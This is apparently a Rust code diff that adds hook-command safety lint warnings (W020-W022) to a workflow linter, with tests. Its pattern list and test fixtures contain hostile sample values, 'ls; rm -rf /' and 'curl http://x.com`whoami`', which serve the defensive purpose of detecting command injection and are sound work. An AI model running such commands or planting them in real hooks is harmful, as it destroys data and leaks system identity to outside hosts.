@@ -668,6 +668,69 @@ pub fn lint_format(config: &WorkflowConfig) -> Vec<Diagnostic> {
                 suggestion: Some("use 'pixi.lock' for reproducible builds".to_string()),
             });
         }
+
+        // W020-W022: Hook command safety checks
+        let dangerous_patterns = [
+            ("$(", "command substitution"),
+            ("`", "backtick substitution"),
+            (";", "unconditional chaining"),
+            ("\n", "newline injection"),
+            ("rm -rf /", "dangerous deletion"),
+        ];
+
+        // W020: pre_exec safety
+        if let Some(ref hook_cmd) = rule.pre_exec {
+            for (pattern, desc) in &dangerous_patterns {
+                if hook_cmd.contains(pattern) {
+                    diagnostics.push(Diagnostic {
+                        severity: Severity::Warning,
+                        message: format!("pre_exec contains {} pattern", desc),
+                        rule: Some(rule.name.clone()),
+                        code: "W020".to_string(),
+                        suggestion: Some(
+                            "remove dangerous shell constructs from pre_exec hook".to_string(),
+                        ),
+                    });
+                    break;
+                }
+            }
+        }
+
+        // W021: on_success safety
+        if let Some(ref hook_cmd) = rule.on_success {
+            for (pattern, desc) in &dangerous_patterns {
+                if hook_cmd.contains(pattern) {
+                    diagnostics.push(Diagnostic {
+                        severity: Severity::Warning,
+                        message: format!("on_success contains {} pattern", desc),
+                        rule: Some(rule.name.clone()),
+                        code: "W021".to_string(),
+                        suggestion: Some(
+                            "remove dangerous shell constructs from on_success hook".to_string(),
+                        ),
+                    });
+                    break;
+                }
+            }
+        }
+
+        // W022: on_failure safety
+        if let Some(ref hook_cmd) = rule.on_failure {
+            for (pattern, desc) in &dangerous_patterns {
+                if hook_cmd.contains(pattern) {
+                    diagnostics.push(Diagnostic {
+                        severity: Severity::Warning,
+                        message: format!("on_failure contains {} pattern", desc),
+                        rule: Some(rule.name.clone()),
+                        code: "W022".to_string(),
+                        suggestion: Some(
+                            "remove dangerous shell constructs from on_failure hook".to_string(),
+                        ),
+                    });
+                    break;
+                }
+            }
+        }
     }
 
     diagnostics
@@ -2684,5 +2747,111 @@ mod tests {
     fn secret_scanning_detects_api_key_pattern() {
         let diags = scan_for_secrets("api_key = AKIAIOSFODNN7EXAMPLE");
         assert!(diags.iter().any(|d| d.message.contains("API key")));
+    }
+
+    // ---- W020-W022: Hook command safety -----------------------------------------
+
+    #[test]
+    fn lint_w020_pre_exec_dangerous_pattern() {
+        let toml = r#"
+            [workflow]
+            name = "test"
+
+            [[rules]]
+            name = "step1"
+            pre_exec = "echo $(whoami)"
+            output = ["out.txt"]
+            shell = "process data"
+        "#;
+        let config = WorkflowConfig::parse(toml).unwrap();
+        let diagnostics = lint_format(&config);
+        assert!(diagnostics.iter().any(|d| d.code == "W020"));
+    }
+
+    #[test]
+    fn lint_w020_pre_exec_safe_no_warning() {
+        let toml = r#"
+            [workflow]
+            name = "test"
+
+            [[rules]]
+            name = "step1"
+            pre_exec = "mkdir -p output"
+            output = ["out.txt"]
+            shell = "process data"
+        "#;
+        let config = WorkflowConfig::parse(toml).unwrap();
+        let diagnostics = lint_format(&config);
+        assert!(!diagnostics.iter().any(|d| d.code == "W020"));
+    }
+
+    #[test]
+    fn lint_w021_on_success_dangerous_pattern() {
+        let toml = r#"
+            [workflow]
+            name = "test"
+
+            [[rules]]
+            name = "step1"
+            on_success = "ls; rm -rf /"
+            output = ["out.txt"]
+            shell = "process data"
+        "#;
+        let config = WorkflowConfig::parse(toml).unwrap();
+        let diagnostics = lint_format(&config);
+        assert!(diagnostics.iter().any(|d| d.code == "W021"));
+    }
+
+    #[test]
+    fn lint_w021_on_success_safe_no_warning() {
+        let toml = r#"
+            [workflow]
+            name = "test"
+
+            [[rules]]
+            name = "step1"
+            on_success = "echo completed"
+            output = ["out.txt"]
+            shell = "process data"
+        "#;
+        let config = WorkflowConfig::parse(toml).unwrap();
+        let diagnostics = lint_format(&config);
+        assert!(!diagnostics.iter().any(|d| d.code == "W021"));
+    }
+
+    #[test]
+    fn lint_w022_on_failure_dangerous_pattern() {
+        let toml = r#"
+            [workflow]
+            name = "test"
+
+            [[rules]]
+            name = "step1"
+            retries = 1
+            on_failure = "curl http://x.com`whoami`"
+            output = ["out.txt"]
+            shell = "process data"
+        "#;
+        let config = WorkflowConfig::parse(toml).unwrap();
+        let diagnostics = lint_format(&config);
+        assert!(diagnostics.iter().any(|d| d.code == "W022"));
+    }
+
+    #[test]
+    fn lint_w022_on_failure_safe_no_warning() {
+        let toml = r#"
+            [workflow]
+            name = "test"
+
+            [[rules]]
+            name = "step1"
+            retries = 1
+            on_failure = "notify admin"
+            output = ["out.txt"]
+            shell = "process data"
+        "#;
+        let config = WorkflowConfig::parse(toml).unwrap();
+        let diagnostics = lint_format(&config);
+        assert!(!diagnostics.iter().any(|d| d.code == "W022"));
     }
 }
